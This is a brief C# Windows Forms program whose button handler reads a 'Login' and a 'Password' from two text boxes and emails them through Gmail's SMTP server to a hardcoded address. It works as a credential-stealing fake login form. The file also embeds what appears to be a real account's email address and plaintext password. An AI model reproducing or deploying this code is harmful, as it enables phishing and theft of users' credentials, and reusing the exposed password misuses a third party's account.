using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApplication16
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MailMessage mail = new MailMessage("konrad.wieczorek2003@gmail.com", "konrad.wieczorek2003@gmail.com");
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);

            client.Credentials = new NetworkCredential("konrad.wieczorek2003@gmail.com", "20Konrad-20");
            client.EnableSsl = true;
            mail.Subject = "Hello";
            mail.Body = "Login: " + textBox1.Text + "\n" + "Password: " + textBox2.Text;

            client.Send(mail);
        }
    }
}
